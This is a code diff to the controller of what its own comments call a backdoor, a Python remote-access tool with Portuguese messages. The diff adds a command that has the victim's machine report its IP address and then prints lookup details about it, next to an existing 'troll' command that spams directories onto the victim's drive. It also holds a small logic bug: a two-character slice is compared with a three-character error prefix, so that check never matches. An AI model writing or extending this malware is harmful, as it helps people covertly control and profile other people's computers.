@@ -94,6 +94,7 @@ while True:
                     except Exception as errorcode:
                         print(f'\n\33[7;31m[ERROR] {errorcode}\33[m')
 
+
                 ## Cria varios diretorios(troll)
                 elif(command == 'nxt_spamdir'):
                     dir = input('\33[1;93m[DIR] Digite o diretorio a ser criado as pastas(Escolha corretamente, caso aperte enter ele irá criar na pasta base, exemplo C:\).\n>\33[m ').strip()
@@ -118,6 +119,25 @@ while True:
                     else:
                         print(f'\n\33[7;31m[ERROR] Falha em concluir o spam do arquivo.\33[m\nDESC: {result}')
 
+
+                ## Printa as informações do IP da vitima
+                elif(command == 'nxt_infoip'):
+                    try:
+                        data = {'command':'nxt_infoip'}
+                        client.send(bytes(str(data), 'UTF-8'))
+                        result = client.recv(1024).decode()
+                        if(result[0:2] != 'E: '):
+                            data = GetIPInfo(query=result)
+                            print(f'\n\n\33[1;32m{"[SUCESS]":^40}\33[m\n\n')
+                            for i in data:
+                                print(f'{i: <25}{data[i]}')
+                        else:
+                            print(f'\n\33[7;31m[ERROR] Houve algum erro na tentativa de verificar as informacoes do IP da vitima.\nDESC: {result[2::]}\33[m')
+                            continue
+                    except Exception as ex:
+                        print(f'\n\33[7;31m[ERROR] Houve algum erro na tentativa de verificar as informacoes do IP da vitima.\nDESC: {ex}\33[m')
+                    else:
+                        continue
 
                 ## Printa na tela os comandos do backdoor.
                 elif(command == 'nxt_help'): 
